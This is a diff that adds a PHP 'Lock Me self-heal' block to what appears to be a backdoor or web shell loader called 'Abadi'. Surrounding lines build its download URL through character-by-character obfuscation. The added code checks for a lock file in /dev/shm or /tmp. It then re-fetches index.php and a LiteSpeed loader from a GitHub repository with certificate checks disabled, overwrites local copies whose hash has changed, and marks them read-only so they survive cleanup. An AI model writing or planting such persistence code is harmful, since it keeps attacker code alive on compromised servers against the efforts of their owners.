@@ -15,6 +15,106 @@ if (!headers_sent()) {
 define('A'.'B'.'A'.'D'.'I'.'_'.'U'.'R'.'L', 'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m'.'/'.'B'.'l'.'a'.'c'.'k'.'N'.'o'.'v'.'a'.'H'.'u'.'b'.'/'.'A'.'b'.'a'.'d'.'i'.'N'.'a'.'n'.'J'.'a'.'y'.'a'.'/'.'r'.'e'.'f'.'s'.'/'.'h'.'e'.'a'.'d'.'s'.'/'.'m'.'a'.'i'.'n'.'/'.'i'.'n'.'d'.'e'.'x'.'.'.'p'.'h'.'p');
 define('A'.'B'.'A'.'D'.'I'.'_'.'T'.'T'.'L', 300);
 
+/** Lock Me self-heal (Linux only) — restore index.php + loader dari GitHub jika lock aktif */
+(function () {
+    $os = strtoupper(substr(PHP_OS, 0, 3));
+    if ($os === 'WIN') return;
+    if (defined('PHP_OS_FAMILY') && (PHP_OS_FAMILY === 'Windows' || PHP_OS_FAMILY === 'Darwin')) return;
+    $isLinux = (stripos(PHP_OS, 'Linux') !== false) || (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY === 'Linux');
+    if (!$isLinux && stripos(PHP_OS, 'Darwin') !== false) return;
+    if (!$isLinux && $os === 'DAR') return;
+
+    $dir = dirname(__FILE__);
+    $host = !empty($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'cli';
+    $key = substr(md5($dir . '|' . $host), 0, 16);
+    $cands = array('/dev/shm/abadi_data', '/tmp/abadi_data');
+    if (function_exists('sys_get_temp_dir')) {
+        $s = @sys_get_temp_dir();
+        if ($s) $cands[] = rtrim($s, '/\\') . '/abadi_data';
+    }
+    $stateFile = '';
+    $state = null;
+    foreach ($cands as $d) {
+        $f = $d . '/lock_' . $key . '.json';
+        if (is_file($f)) {
+            $stateFile = $f;
+            $state = @json_decode((string)@file_get_contents($f), true);
+            break;
+        }
+    }
+    // mirror pointer
+    if ((!is_array($state) || empty($state['enabled'])) && is_file($dir . '/.abadi_lock')) {
+        $m = @json_decode((string)@file_get_contents($dir . '/.abadi_lock'), true);
+        if (is_array($m) && !empty($m['state']) && is_file($m['state'])) {
+            $stateFile = $m['state'];
+            $state = @json_decode((string)@file_get_contents($stateFile), true);
+        }
+    }
+    if (!is_array($state) || empty($state['enabled'])) return;
+
+    $urls = array(
+        'index.php' => 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/index.php',
+        'abadi_litespeed.php' => 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/abadi_litespeed.php',
+    );
+    $fetch = function ($url) {
+        $b = false;
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            @curl_setopt($ch, CURLOPT_TIMEOUT, 40);
+            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            @curl_setopt($ch, CURLOPT_USERAGENT, 'AbadiLSHeal/1');
+            $b = @curl_exec($ch);
+            @curl_close($ch);
+        }
+        if ($b === false || $b === '') {
+            $ctx = stream_context_create(array(
+                'http' => array('timeout' => 40, 'header' => "User-Agent: AbadiLSHeal/1\r\n"),
+                'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
+            ));
+            $b = @file_get_contents($url, false, $ctx);
+        }
+        return (is_string($b) && strlen($b) > 64 && strpos($b, '<?php') !== false) ? $b : false;
+    };
+    $write = function ($path, $body) {
+        // tanpa chattr (biasanya butuh root)
+        if (is_file($path)) @chmod($path, 0644);
+        $t = $path . '.tmp_' . mt_rand(100, 999);
+        if (@file_put_contents($t, $body) !== false) {
+            @rename($t, $path);
+            @unlink($t);
+        } else {
+            @file_put_contents($path, $body);
+        }
+        @chmod($path, 0444);
+    };
+
+    $hashes = (isset($state['hashes']) && is_array($state['hashes'])) ? $state['hashes'] : array();
+    $changed = false;
+    foreach ($urls as $name => $url) {
+        $path = $dir . '/' . $name;
+        $ex = is_file($path) && @filesize($path) > 32;
+        $h = $ex ? @md5_file($path) : '';
+        $want = isset($hashes[$name]) ? $hashes[$name] : '';
+        if (!$ex || ($want && $h && $h !== $want)) {
+            $body = $fetch($url);
+            if ($body !== false) {
+                $write($path, $body);
+                $hashes[$name] = md5($body);
+                $changed = true;
+            }
+        } else {
+            if ($ex) @chmod($path, 0444);
+        }
+    }
+    if ($changed && $stateFile !== '') {
+        $state['hashes'] = $hashes;
+        $state['last_heal'] = time();
+        @file_put_contents($stateFile, json_encode($state));
+    }
+})();
+
 /**
  * Cache HANYA di luar webroot:
  *   /dev/shm/abadi_data  (RAM, prioritas)
